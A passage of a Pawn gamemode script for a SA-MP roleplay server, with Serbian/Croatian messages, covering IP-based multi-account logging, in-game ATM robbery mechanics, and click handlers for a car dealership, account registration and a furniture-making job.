				PlayerPlaySound( playerid, 1145, 0.0, 0.0, 0.0);
				SMG_TogglePlayerControllable( playerid, true );
    			PokusajProvala[playerid] = false;
			}
		}
	}
	return 1;
}
//------------------------------------------------------------------------------
_:public SaveIpsByName( playerid )
{
    new entry[ 128 ], file_name[ 64 ];
	format( file_name, sizeof( file_name ), "MultiIPs/%s.cfg", ImeIgraca( playerid ) );

    new playersip[ 128 ];
    GetPlayerIp( playerid, playersip, sizeof( playersip ) );

	format( entry, sizeof( entry ), "%s,1\r\n", playersip );

	new File:hFile;
	hFile = fopen( file_name, io_append );
	fwrite( hFile, entry );
	fclose( hFile );
}

_:public CheckMultiAcc( playerid, playersip[] )
{
    new file_name[ 256 ];
	format( file_name, sizeof( file_name ), "MultiAccs/%s.cfg", playersip );

	if( fexist( file_name ) )
	{
		new File:_h_handler = fopen(file_name, io_read), _l_str[256];
        new imeigraca[ 2 ][ 128 ], ima = -1;
		while( fread(_h_handler, _l_str))
		{
		    split( _l_str, imeigraca, ',' );

		    if( !strcmp( imeigraca[ 0 ], ImeIgraca( playerid ), true ) )
			{
		        ima = 1;
		        break;
		    }
		}

		fclose( _h_handler );
		if( ima == -1 )
		{
		    SaveNameByIps( playerid, playersip );
		}
	}
	else
	{
	    SaveNameByIps( playerid, playersip );
	}
	return 1;
}

_:public SaveNameByIps( playerid, playersip[] )
{
    new entry[ 128 ], file_name[ 256 ];
	format( file_name, sizeof( file_name ), "MultiAccs/%s.cfg", playersip );

	format( entry, sizeof( entry ), "%s,1\r\n", ImeIgraca( playerid ) );

	new File:hFile;
	hFile = fopen( file_name, io_append );
	fwrite( hFile, entry );
	fclose( hFile );
}

_:public fLoadIpsByName( playerid )
{
	new file_name[ 64 ];
	format( file_name, sizeof( file_name ), "MultiIPs/%s.cfg", ImeIgraca( playerid ) );

    new playersip[ 128 ];
    GetPlayerIp( playerid, playersip, sizeof( playersip ) );

	if( fexist( file_name ) )
	{
		new File:_h_handler = fopen(file_name, io_read), _l_str[256];
        new ipigraca[ 2 ][ 128 ], ima = -1;
		while( fread(_h_handler, _l_str))
		{
		    split( _l_str, ipigraca, ',' );

		    if( !strcmp( playersip, ipigraca[ 0 ], true ) )
			{
		        ima = 1;
		        break;
		    }
		}

		fclose( _h_handler );
		if( ima == -1 )
		{
		    SaveIpsByName( playerid );
		}
		CheckMultiAcc( playerid, playersip );
	}
	else
	{
	    SaveIpsByName( playerid );
	    CheckMultiAcc( playerid, playersip );
	}
	return 1;
}
//------------------------------------------------------------------------------
_:public RobZiceAtm( playerid )
{
	if( playerid != IPI && PlayerLogged[ playerid ] && robbingATM[ playerid ] != -1 )
	{
		if( robbingATM[ playerid ] == GetNearestAtm( playerid ) )
		{
			new stringic[ 128 ];

			robbingATMSeconds[ playerid ]--;

		    format( stringic, sizeof( stringic ), "~w~Ostani pored ~r~bankomata ~w~dok~n~vreme ne istekne ~r~%d ~w~sec!", robbingATMSeconds[ playerid ] );
		    GameTextForPlayer( playerid, stringic, 1500, 4 );

			if( robbingATMSeconds[ playerid ] == 0 )
			{
			    KillTimer(_progressatmbar[playerid]);

			    new brojcina = random(14);

		        robbingATMSeconds[ playerid ] = 95;
				if( brojcina < 7 )
				{
				    ATMTDControl( playerid, false );
				    PostaviWanted( playerid, "Pokusaj pljacke bankomata", "Nepoznati", 5 );

				    atmInfo[ robbingATM[ playerid ] ][ atmVremeDoRoba ] = 60;
				    SacuvajATM( robbingATM[ playerid ] );
				    PlayerInfo[ playerid ][ xPljackaVreme ] = 60;

				    SendInfoMessage( playerid, "Isekli ste pogresnu zicu i oglasili alarm." );
				}
				else if( brojcina >= 7 )
				{
				    SelectTextDraw( playerid, 0x4282C0FF );

			     	atmInfo[ robbingATM[ playerid ] ][ atmPreseceneZice ] = true;
					SacuvajATM( robbingATM[ playerid ] );

				    SendInfoMessage( playerid, "Uspesno ste srusili odbrambeni sistem.");
					SendInfoMessage( playerid, "Sada mozete ukrasti novac iz bankomata.");
				}
			}
		}
		else
		{
		    ATMTDControl( playerid, false );

		    KillTimer(_progressatmbar[playerid]);

		    PostaviWanted( playerid, "Pokusaj pljacke bankomata", "Nepoznati", 5 );
		    atmInfo[ robbingATM[ playerid ] ][ atmVremeDoRoba ] = 60;
		    SacuvajATM( robbingATM[ playerid ] );
		    PlayerInfo[ playerid ][ xPljackaVreme ] = 60;

		    robbingATM[ playerid ] = -1;
		    robbingATMSeconds[ playerid ] = 95;
		    SendInfoMessage( playerid, "Pomerili ste se od bankomata i probijanje istog je prekinuto." );
		}
	}
}
//------------------------------------------------------------------------------
_:public ProgresAtmBar( playerid )
{
	if( robbingATM[ playerid ] == GetNearestAtm( playerid ) )
	{
	    new Float:Value = GetPlayerProgressBarValue( playerid, ATMRobBar_pTD[ playerid ] );
	    if( Value != 100 )
		{
			SetPlayerProgressBarValue( playerid, ATMRobBar_pTD[ playerid ], Value+1 );

			new stringic[ 5 ];
	    	format( stringic, sizeof( stringic ), "%d%", floatround( Value+1 ) );
	    	PlayerTextDrawSetString( playerid, ATMRobLoading_pTD[ playerid ][ 1 ], stringic );

	    	SetPlayerTimerEx(playerid, "ProgresAtmBar", 1000, false, "i", playerid);
		}
		else if( Value == 100 )
		{
		    if( LaptopRuke[ playerid ] )
			{
			    SelectTextDraw( playerid, 0x4282C0FF );
			    KillTimer(_progressatmbar[playerid]);
			    atmLoadingTDControl( playerid, false );

			    HidePlayerProgressBar(playerid, ATMRobBar_pTD[ playerid ] );
			    DestroyPlayerProgressBar(playerid, ATMRobBar_pTD[ playerid ] );
			    ATMRobBar_pTD[ playerid ] = PlayerBar:INVALID_PLAYER_BAR_ID;

	            atmInfo[ robbingATM[ playerid ] ][ atmProbijenBios ] = true;
				SacuvajATM( robbingATM[ playerid ] );

			    SendInfoMessage( playerid, "Uspesno ste srusili odbrambeni sistem.");
				SendInfoMessage( playerid, "Sada mozete prebaciti novac na vas racun.");

				robbingATM[ playerid ] = -1;
			}
			else
			{
       			ATMTDControl( playerid, false );

			    KillTimer(_progressatmbar[playerid]);
			    atmLoadingTDControl( playerid, false );

			    HidePlayerProgressBar(playerid, ATMRobBar_pTD[ playerid ] );
			    DestroyPlayerProgressBar(playerid, ATMRobBar_pTD[ playerid ] );
			    ATMRobBar_pTD[ playerid ] = PlayerBar:INVALID_PLAYER_BAR_ID;

			    PostaviWanted( playerid, "Pokusaj pljacke bankomata", "Nepoznati", 5 );

			    atmInfo[ robbingATM[ playerid ] ][ atmVremeDoRoba ] = 60;
			    SacuvajATM( robbingATM[ playerid ] );
			    PlayerInfo[ playerid ][ xPljackaVreme ] = 60;

			    robbingATM[ playerid ] = -1;

			    SendInfoMessage( playerid, "Nemate laptop u rukama i prekunuta vam je pljacka." );
			}
		}
	}
	else
	{
	    ATMTDControl( playerid, false );

	    KillTimer(_progressatmbar[playerid]);
	    atmLoadingTDControl( playerid, false );

	    HidePlayerProgressBar(playerid, ATMRobBar_pTD[ playerid ] );
	    DestroyPlayerProgressBar(playerid, ATMRobBar_pTD[ playerid ] );
	    ATMRobBar_pTD[ playerid ] = PlayerBar:INVALID_PLAYER_BAR_ID;

	    PostaviWanted( playerid, "Pokusaj pljacke bankomata", "Nepoznati", 5 );

	    atmInfo[ robbingATM[ playerid ] ][ atmVremeDoRoba ] = 60;
	    SacuvajATM( robbingATM[ playerid ] );
	    PlayerInfo[ playerid ][ xPljackaVreme ] = 60;

	    robbingATM[ playerid ] = -1;

	    SendInfoMessage( playerid, "Pomerili ste se od bankomata i vase hakovanje istog je prekinuto." );
	}
}
//------------------------------------------------------------------------------
public OnPlayerClickPlayerTextDraw(playerid, PlayerText:playertextid)
{
    if(_:playertextid != INVALID_TEXT_DRAW)
	{
        if(as_Buying[playerid] == true)
		{
			if(playertextid == SalonVozila_pTD[playerid][9])
			{
				format( globalstring, 144, "{FFFFFF}Da li ste sigurni da zelite kupiti vozilo {4282C0}%s.\n{FFFFFF}Cena: {4282C0}($%d)", SalonVozila[as_Model[playerid]][vName], SalonVozila[as_Model[playerid]][vPrice]);
				ShowPlayerDialog( playerid, dialog_VEHMONEYBUY, DIALOG_STYLE_MSGBOX, D_NASLOV, globalstring, "Kupi", "Odustani" );
			}
			else if(playertextid == SalonVozila_pTD[playerid][10])
			{
				if(as_Model[playerid] <= 0) return SendErrorMessage(playerid, "Ne mozete vise nazad.");

				as_Model[playerid]--;
				PlayerTextDrawSetPreviewModel(playerid, SalonVozila_pTD[playerid][3], SalonVozila[as_Model[playerid]][vID]);
				PlayerTextDrawShow(playerid, SalonVozila_pTD[playerid][3]);

				new salonstring[32];
				format(salonstring, sizeof(salonstring), "Model: ~y~%s", SalonVozila[as_Model[playerid]][vName]);
				PlayerTextDrawSetString(playerid, SalonVozila_pTD[playerid][5], salonstring);
				format(salonstring, sizeof(salonstring), "Price: ~y~$%d", SalonVozila[as_Model[playerid]][vPrice]);
				PlayerTextDrawSetString(playerid, SalonVozila_pTD[playerid][8], salonstring);
			}
			else if(playertextid == SalonVozila_pTD[playerid][11])
			{
				if(as_Model[playerid] >= 99) return SendErrorMessage(playerid, "Ne mozete vise naprijed.");

				as_Model[playerid]++;
				PlayerTextDrawSetPreviewModel(playerid, SalonVozila_pTD[playerid][3], SalonVozila[as_Model[playerid]][vID]);
				PlayerTextDrawShow(playerid, SalonVozila_pTD[playerid][3]);

				new salonstring[32];
				format(salonstring, sizeof(salonstring), "Model: ~y~%s", SalonVozila[as_Model[playerid]][vName]);
				PlayerTextDrawSetString(playerid, SalonVozila_pTD[playerid][5], salonstring);
				format(salonstring, sizeof(salonstring), "Price: ~y~$%d", SalonVozila[as_Model[playerid]][vPrice]);
				PlayerTextDrawSetString(playerid, SalonVozila_pTD[playerid][8], salonstring);
			}
			return 1;
		}
		//---------------------
		else
		{
  			if(playertextid == Register_pTD[playerid][17] )
			{
		    	ShowPlayerDialog(playerid, dialog_REGISTER, DIALOG_STYLE_INPUT, "{FFFFFF}Password:", "{FFFFFF}Unesite zeljenu lozinku.\n\n{FF0000}NAPOMENA: {FFFFFF}Password moze sadrzavati minimalno 6, a maximalno 24 znaka, te slova i brojke.", "Registriraj", "Izadji");
				CancelSelectTextDraw(playerid);
	            return 1;
		    }
	 	    else if(playertextid == Register_pTD[playerid][18] )
			{
		    	ShowPlayerDialog(playerid, dialog_MAIL, DIALOG_STYLE_INPUT, "{FFFFFF}Mail:", "{FFFFFF}* U prazni prostor ispod unesite vasu e-mail adresu.\nE-mail adresa ce nam posluziti u vracanju vasih passworda.\n{FF0000}(Bez maila nema vracanja passworda):", "Unos", "Izadji");
				CancelSelectTextDraw(playerid);
	            return 1;
		    }
		    else if(playertextid == Register_pTD[playerid][19] )
			{
		        ShowPlayerDialog(playerid, dialog_AGE, DIALOG_STYLE_INPUT, "{FFFFFF}Godine:", "{FFFFFF}U prazni prostor ispod unesite vase godine.\nMinimalno 12 maximalno 70:", "Unos", "Izadji");
		    	CancelSelectTextDraw(playerid);
	            return 1;
			}
		    else if(playertextid == Register_pTD[playerid][20] )
			{
		    	ShowPlayerDialog(playerid, dialog_COUNTRY, DIALOG_STYLE_LIST, "{FFFFFF}Poreklo:", "{4282C0}(1). {FFFFFF}Makedonija\n{4282C0}(2). {FFFFFF}Hrvatska\n{4282C0}(3). {FFFFFF}Srbija\n{4282C0}(4). {FFFFFF}Montenegro\n{4282C0}(5). {FFFFFF}Bosna i Hercegovina\n{4282C0}(6). {FFFFFF}Other", "Odabir", "Izadji");
		    	CancelSelectTextDraw(playerid);
	            return 1;
			}
			else if(playertextid == Register_pTD[playerid][30]) // registruj
			{
                if(InputPassword[playerid] == false) return GameTextForPlayer(playerid, "~r~Niste upisali lozinku.", 3000, 3);
                if(InputMail[playerid] == false) return GameTextForPlayer(playerid, "~r~Niste upisali email.", 3000, 3);
				if(ChoseCountry[playerid] == 0) return GameTextForPlayer(playerid, "~r~Niste odabrali poreklo.", 3000, 3);
				if(InputAge[playerid] == 0) return GameTextForPlayer(playerid, "~r~Niste odabrali godine.", 3000, 3);
				if(RegSex[playerid] == 0) return GameTextForPlayer(playerid, "~r~Niste odabrali pol.", 3000, 3);

				new poreklo[ 32 ];
              	switch(ChoseCountry[playerid ])
				{
		            case 1: poreklo = "Makedonija";
		            case 2: poreklo = "Hrvatska";
		            case 3: poreklo = "Srbija";
		            case 4: poreklo = "Montenegro";
		            case 5: poreklo = "Bosna i Hercegovina";
		            case 6: poreklo = "Other";
				}

                strdel(sDStrg, 0, sizeof(sDStrg ));
			    format(sDStrg, sizeof(sDStrg), DialogTekstovi[4], ImeIgraca(playerid), accountRealPass[playerid], PlayerInfo[playerid][xMail], InputAge[playerid], (RegSex[playerid] == 1 ? "Musko" : "Zensko"), poreklo);
			    PlayerTextDrawSetString(playerid, Register_pTD[playerid][25], "~g~DONE.....");
				ShowPlayerDialog(playerid, dialog_REGCONFRM, DIALOG_STYLE_MSGBOX, "{FFFFFF}Registracija:", sDStrg, "DA", "NE");
			    strdel(sDStrg, 0, sizeof(sDStrg ));
			}
		    else if(playertextid == Register_pTD[playerid][24]) { // musko
				if(RegSex[playerid] == 1) return 1;
	        	PlayerInfo[playerid][xPol] = 1;
				RegSex[playerid] = 1;
				BiraSkin[playerid] = 0;

                PlayerTextDrawColor(playerid, Register_pTD[playerid][24], -1);
                PlayerTextDrawColor(playerid, Register_pTD[playerid][25], -224);

				PlayerTextDrawShow(playerid, Register_pTD[playerid][24]);
				PlayerTextDrawShow(playerid, Register_pTD[playerid][25]);

				SelectTextDraw(playerid, 0x4282C0FF);

				PlayerTextDrawSetPreviewModel(playerid, Register_pTD[playerid][24], MaleSkinIDs[0][0]);
				PlayerTextDrawShow(playerid, Register_pTD[playerid][24]);

			    SMG_SetPlayerPos(playerid, 1434.6115, -978.9854, 1004.8176);
			    SetPlayerFacingAngle(playerid, 232.6810);
				SMG_SetPlayerSkin(playerid, MaleSkinIDs[0][0]);
		    	return 1;
		    }
		    else if(playertextid == Register_pTD[playerid][25]) { // zensko
				if(RegSex[playerid] == 2) return 1;
	        	PlayerInfo[playerid][xPol] = 2;
				RegSex[playerid] = 2;
				BiraSkin[playerid] = 0;

				PlayerTextDrawColor(playerid, Register_pTD[playerid][25], -1);
                PlayerTextDrawColor(playerid, Register_pTD[playerid][24], -224);

				PlayerTextDrawShow(playerid, Register_pTD[playerid][25]);
				PlayerTextDrawShow(playerid, Register_pTD[playerid][24]);

				SelectTextDraw(playerid, 0x4282C0FF);

				PlayerTextDrawSetPreviewModel(playerid, Register_pTD[playerid][25], FemaleSkinIDs[0][0]);
				PlayerTextDrawShow(playerid, Register_pTD[playerid][25]);

			    SMG_SetPlayerPos(playerid, 1434.6115, -978.9854, 1004.8176);
			    SetPlayerFacingAngle(playerid, 232.6810);
				SMG_SetPlayerSkin(playerid, FemaleSkinIDs[0][0]);
		    	return 1;
		    }
			else if(playertextid == Register_pTD[playerid][31] ) { // bira skin desno
				if(RegSex[playerid] == 0) return 1;
			    if(RegSex[playerid] == 1 ) {
			        if(BiraSkin[playerid] == 3) return 1;
			        BiraSkin[playerid]++;
			        PlayerInfo[playerid][xSkin] = MaleSkinIDs[BiraSkin[playerid]][0];

			        SMG_SetPlayerSkin(playerid, PlayerInfo[playerid][xSkin]);

					PlayerTextDrawSetPreviewModel(playerid, Register_pTD[playerid][24], MaleSkinIDs[BiraSkin[playerid]][0]);
					PlayerTextDrawShow(playerid, Register_pTD[playerid][24]);
			    }
			    else if(RegSex[playerid] == 2 ) {
			        if(BiraSkin[playerid] == 3) return 1;
			        BiraSkin[playerid]++;
			        PlayerInfo[playerid][xSkin] = FemaleSkinIDs[BiraSkin[playerid]][0];

			        SMG_SetPlayerSkin(playerid, PlayerInfo[playerid][xSkin]);

					PlayerTextDrawSetPreviewModel(playerid, Register_pTD[playerid][24], FemaleSkinIDs[BiraSkin[playerid]][0]);
					PlayerTextDrawShow(playerid, Register_pTD[playerid][24]);
				}
			    return true;
			}
			else if(playertextid == Register_pTD[playerid][32] ) { // bira skin lijevo
				if(RegSex[playerid] == 0) return 1;
			    if(RegSex[playerid] == 1 ) {
			        if(BiraSkin[playerid] == 0) return 1;
			        BiraSkin[playerid]--;
			        PlayerInfo[playerid][xSkin] = MaleSkinIDs[BiraSkin[playerid]][0];

			        SMG_SetPlayerSkin(playerid, PlayerInfo[playerid][xSkin]);

					PlayerTextDrawSetPreviewModel(playerid, Register_pTD[playerid][24], MaleSkinIDs[BiraSkin[playerid]][0]);
					PlayerTextDrawShow(playerid, Register_pTD[playerid][24]);
			    }
			    else if(RegSex[playerid] == 2 ) {
			        if(BiraSkin[playerid] == 0) return 1;
			        BiraSkin[playerid]--;
			        PlayerInfo[playerid][xSkin] = FemaleSkinIDs[BiraSkin[playerid]][0];

			        SMG_SetPlayerSkin(playerid, PlayerInfo[playerid][xSkin]);

					PlayerTextDrawSetPreviewModel(playerid, Register_pTD[playerid][24], FemaleSkinIDs[BiraSkin[playerid]][0]);
					PlayerTextDrawShow(playerid, Register_pTD[playerid][24]);
			    }
			    return true;
			}
		    //
		    if(playertextid == PNamjestaj_pTD[playerid][8]) 
		    {
				GameTextForPlayer(playerid, "~y~Sacekajte malo...", 8500, 1);
			    SetPlayerTimerEx(playerid, "posaoProizdvodacNamjestaja", 10000, false, "ii", playerid, 2);
       			CheckpointStatus[playerid] = 0;
		        posao_PNamjestajTDs(playerid, false);
		        SMG_DisablePlayerCheckpoint(playerid);

		        NamjestajColorObject[playerid] = 19831;
	            NamjestajObject[ playerid ] = CreatePlayerObject(playerid, 19831, -2125.8779, 2745.9131, 13.4885, -90.0000, 0.0000, 270.0000);
                MovePlayerObject(playerid, NamjestajObject[ playerid ], -2136.8779, 2745.9131, 13.4885, 1.0);
			}
		    if(playertextid == PNamjestaj_pTD[playerid][9]) 
		    {
				GameTextForPlayer(playerid, "~y~Sacekajte malo...", 8500, 1);
			    SetPlayerTimerEx(playerid, "posaoProizdvodacNamjestaja", 10000, false, "ii", playerid, 2);
       			CheckpointStatus[playerid] = 0;
		        posao_PNamjestajTDs(playerid, false);
		        SMG_DisablePlayerCheckpoint(playerid);

		        NamjestajColorObject[playerid] = 1518;
	            NamjestajObject[ playerid ] = CreatePlayerObject(playerid, 1518, -2125.4529, 2745.9131, 13.4845, 0.0000, 0.0000, 180.0000);
                MovePlayerObject(playerid, NamjestajObject[ playerid ], -2135.9878, 2745.9131, 13.4845, 1.0);
		    }
		    if(playertextid == PNamjestaj_pTD[playerid][10]) 
		    {
				GameTextForPlayer(playerid, "~y~Sacekajte malo...", 8500, 1);
			    SetPlayerTimerEx(playerid, "posaoProizdvodacNamjestaja", 10000, false, "ii", playerid, 2);
       			CheckpointStatus[playerid] = 0;
		        posao_PNamjestajTDs(playerid, false);
		        SMG_DisablePlayerCheckpoint(playerid);

		        NamjestajColorObject[playerid] = 1738;
	            NamjestajObject[playerid] = CreatePlayerObject(playerid, 1738, -2125.0449, 2745.9146, 13.3795, 90.0000, 0.0000, 90.6001);
                MovePlayerObject(playerid, NamjestajObject[playerid], -2136.0449, 2745.9146, 13.3795, 1.0);
		    }
		    if(playertextid == PNamjestaj_pTD[playerid][11]) 
		    {
				GameTextForPlayer(playerid, "~y~Sacekajte malo...", 8500, 1);
			    SetPlayerTimerEx(playerid, "posaoProizdvodacNamjestaja", 10000, false, "ii", playerid, 2);
       			CheckpointStatus[playerid] = 0;
		        posao_PNamjestajTDs(playerid, false);
		        SMG_DisablePlayerCheckpoint(playerid);

		        NamjestajColorObject[playerid] = 1782;
	            NamjestajObject[playerid] = CreatePlayerObject(playerid, 1782, -2125.0449, 2745.9146, 13.2915, 0.0000, 0.0000, 180.0000);
                MovePlayerObject(playerid, NamjestajObject[playerid], -2136.0449, 2745.9146, 13.2915, 1.0);
		    }
		    if(playertextid == PNamjestaj_pTD[playerid][12]) 
		    {
				GameTextForPlayer(playerid, "~y~Sacekajte malo...", 8500, 1);
			    SetPlayerTimerEx(playerid, "posaoProizdvodacNamjestaja", 10000, false, "ii", playerid, 2);
       			CheckpointStatus[playerid] = 0;
		        posao_PNamjestajTDs(playerid, false);
		        SMG_DisablePlayerCheckpoint(playerid);

		        NamjestajColorObject[playerid] = 2339;
	            NamjestajObject[playerid] = CreatePlayerObject(playerid, 2339, -2125.2527, 2745.4185, 13.8395, -90.0000, 0.0000, 0.0000);
                MovePlayerObject(playerid, NamjestajObject[playerid], -2135.7527, 2745.4185, 13.8395, 1.0);
		    }
			//
		    if(playertextid == PNamjestajColor_pTD[playerid][2]) 
		    {
				GameTextForPlayer( playerid, "~y~Sacekajte malo...", 8500, 1);
			    SetPlayerTimerEx(playerid, "posaoProizdvodacNamjestaja", 10000, false, "ii", playerid, 3);
       			CheckpointStatus[ playerid ] = 0;
		        posao_PNamjestajColorTDs(playerid, false);
		        SMG_DisablePlayerCheckpoint( playerid );

                if(NamjestajColorObject[playerid] == 19831) {
		            NamjestajObject[playerid] = CreatePlayerObject(playerid, NamjestajColorObject[playerid], -2136.8779, 2745.9131, 13.4885, -90.0000, 0.0000, 270.0000);
	                MovePlayerObject(playerid, NamjestajObject[ playerid ], -2148.1528, 2745.9131, 13.4885, 1.0);

					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 0, 18996, "mattextures", "sampwhite", 0x00000000);
					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 1, 18996, "mattextures", "sampwhite", 0x00000000);
					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 2, 18996, "mattextures", "sampwhite", 0x00000000);
				}
				else if(NamjestajColorObject[playerid] == 1518) {
		            NamjestajObject[playerid] = CreatePlayerObject(playerid, NamjestajColorObject[playerid], -2135.9878, 2745.9131, 13.4845, 0.0000, 0.0000, 180.0000);
	                MovePlayerObject(playerid, NamjestajObject[playerid], -2146.9878, 2745.9131, 13.4845, 1.0);

					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 3, 18996, "mattextures", "sampwhite", 0x00000000);
				}
				else if(NamjestajColorObject[playerid] == 1738) {
		            NamjestajObject[playerid] = CreatePlayerObject(playerid, NamjestajColorObject[playerid], -2136.0449, 2745.9146, 13.3795, 90.0000, 0.0000, 90.6001);
	                MovePlayerObject(playerid, NamjestajObject[playerid], -2147.5449, 2745.9146, 13.3795, 1.0);

					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 0, 18996, "mattextures", "sampblack", 0x00000000);
					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 1, 18996, "mattextures", "sampwhite", 0x00000000);					
				}
				else if(NamjestajColorObject[playerid] == 1782) {
		            NamjestajObject[playerid] = CreatePlayerObject(playerid, NamjestajColorObject[playerid], -2136.0449, 2745.9146, 13.2915, 0.0000, 0.0000, 180.0000);
	                MovePlayerObject(playerid, NamjestajObject[playerid], -2147.1969, 2745.9146, 13.3795, 1.0);

					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 1, 18996, "mattextures", "sampwhite", 0x00000000);
				}
				else if(NamjestajColorObject[playerid] == 2339) {
		            NamjestajObject[playerid] = CreatePlayerObject(playerid, NamjestajColorObject[playerid], -2135.7527, 2745.4185, 13.8395, -90.0000, 0.0000, 0.0000);
	                MovePlayerObject(playerid, NamjestajObject[playerid], -2147.0476, 2745.4185, 13.8395, 1.0);

					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 0, 18996, "mattextures", "sampwhite", 0x00000000);
					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 1, 18996, "mattextures", "sampwhite", 0x00000000);
					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 2, 18996, "mattextures", "sampwhite", 0x00000000);
				}
			}
		    if(playertextid == PNamjestajColor_pTD[playerid][3]) {
				GameTextForPlayer( playerid, "~y~Sacekajte malo...", 8500, 1);
			    SetPlayerTimerEx(playerid, "posaoProizdvodacNamjestaja", 10000, false, "ii", playerid, 3);
       			CheckpointStatus[ playerid ] = 0;
		        posao_PNamjestajColorTDs(playerid, false);
		        SMG_DisablePlayerCheckpoint( playerid );

                if(NamjestajColorObject[playerid] == 19831) {
		            NamjestajObject[playerid] = CreatePlayerObject(playerid, NamjestajColorObject[playerid], -2136.8779, 2745.9131, 13.4885, -90.0000, 0.0000, 270.0000);
	                MovePlayerObject(playerid, NamjestajObject[ playerid ], -2148.1528, 2745.9131, 13.4885, 1.0);

					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 0, 18996, "mattextures", "sampblack", 0x00000000);
					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 1, 18996, "mattextures", "sampblack", 0x00000000);
					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 2, 18996, "mattextures", "sampblack", 0x00000000);
				}
				else if(NamjestajColorObject[playerid] == 1518) {
		            NamjestajObject[playerid] = CreatePlayerObject(playerid, NamjestajColorObject[playerid], -2135.9878, 2745.9131, 13.4845, 0.0000, 0.0000, 180.0000);
	                MovePlayerObject(playerid, NamjestajObject[playerid], -2146.9878, 2745.9131, 13.4845, 1.0);

					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 3, 18996, "mattextures", "sampblack", 0x00000000);
				}
				else if(NamjestajColorObject[playerid] == 1738) {
		            NamjestajObject[playerid] = CreatePlayerObject(playerid, NamjestajColorObject[playerid], -2136.0449, 2745.9146, 13.3795, 90.0000, 0.0000, 90.6001);
	                MovePlayerObject(playerid, NamjestajObject[playerid], -2147.5449, 2745.9146, 13.3795, 1.0);

					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 0, 18996, "mattextures", "sampblack", 0x00000000);
					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 1, 18996, "mattextures", "sampblack", 0x00000000);					
				}
				else if(NamjestajColorObject[playerid] == 1782) {
		            NamjestajObject[playerid] = CreatePlayerObject(playerid, NamjestajColorObject[playerid], -2136.0449, 2745.9146, 13.2915, 0.0000, 0.0000, 180.0000);
	                MovePlayerObject(playerid, NamjestajObject[playerid], -2147.1969, 2745.9146, 13.3795, 1.0);

					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 1, 18996, "mattextures", "sampblack", 0x00000000);
				}
				else if(NamjestajColorObject[playerid] == 2339) {
		            NamjestajObject[playerid] = CreatePlayerObject(playerid, NamjestajColorObject[playerid], -2135.7527, 2745.4185, 13.8395, -90.0000, 0.0000, 0.0000);
	                MovePlayerObject(playerid, NamjestajObject[playerid], -2147.0476, 2745.4185, 13.8395, 1.0);

					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 0, 18996, "mattextures", "sampwhite", 0x00000000);
					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 1, 18996, "mattextures", "sampblack", 0x00000000);
					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 2, 18996, "mattextures", "sampwhite", 0x00000000);
				}
			}
		    if(playertextid == PNamjestajColor_pTD[playerid][4]) {
				GameTextForPlayer( playerid, "~y~Sacekajte malo...", 8500, 1);
			    SetPlayerTimerEx(playerid, "posaoProizdvodacNamjestaja", 10000, false, "ii", playerid, 3);
       			CheckpointStatus[ playerid ] = 0;
		        posao_PNamjestajColorTDs(playerid, false);
		        SMG_DisablePlayerCheckpoint( playerid );

               	if(NamjestajColorObject[playerid] == 19831) {
		            NamjestajObject[playerid] = CreatePlayerObject(playerid, NamjestajColorObject[playerid], -2136.8779, 2745.9131, 13.4885, -90.0000, 0.0000, 270.0000);
	                MovePlayerObject(playerid, NamjestajObject[ playerid ], -2148.1528, 2745.9131, 13.4885, 1.0);

					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 0, 18996, "mattextures", "sampred", 0x00000000);
					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 1, 18996, "mattextures", "sampred", 0x00000000);
					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 2, 18996, "mattextures", "sampred", 0x00000000);
				}
				else if(NamjestajColorObject[playerid] == 1518) {
		            NamjestajObject[playerid] = CreatePlayerObject(playerid, NamjestajColorObject[playerid], -2135.9878, 2745.9131, 13.4845, 0.0000, 0.0000, 180.0000);
	                MovePlayerObject(playerid, NamjestajObject[playerid], -2146.9878, 2745.9131, 13.4845, 1.0);

					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 3, 18996, "mattextures", "sampred", 0x00000000);
				}
				else if(NamjestajColorObject[playerid] == 1738) {
		            NamjestajObject[playerid] = CreatePlayerObject(playerid, NamjestajColorObject[playerid], -2136.0449, 2745.9146, 13.3795, 90.0000, 0.0000, 90.6001);
	                MovePlayerObject(playerid, NamjestajObject[playerid], -2147.5449, 2745.9146, 13.3795, 1.0);

					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 0, 18996, "mattextures", "sampwhite", 0x00000000);
					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 1, 18996, "mattextures", "sampred", 0x00000000);					
				}
				else if(NamjestajColorObject[playerid] == 1782) {
		            NamjestajObject[playerid] = CreatePlayerObject(playerid, NamjestajColorObject[playerid], -2136.0449, 2745.9146, 13.2915, 0.0000, 0.0000, 180.0000);
	                MovePlayerObject(playerid, NamjestajObject[playerid], -2147.1969, 2745.9146, 13.3795, 1.0);

					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 1, 18996, "mattextures", "sampred", 0x00000000);
				}
				else if(NamjestajColorObject[playerid] == 2339) {
		            NamjestajObject[playerid] = CreatePlayerObject(playerid, NamjestajColorObject[playerid], -2135.7527, 2745.4185, 13.8395, -90.0000, 0.0000, 0.0000);
	                MovePlayerObject(playerid, NamjestajObject[playerid], -2147.0476, 2745.4185, 13.8395, 1.0);

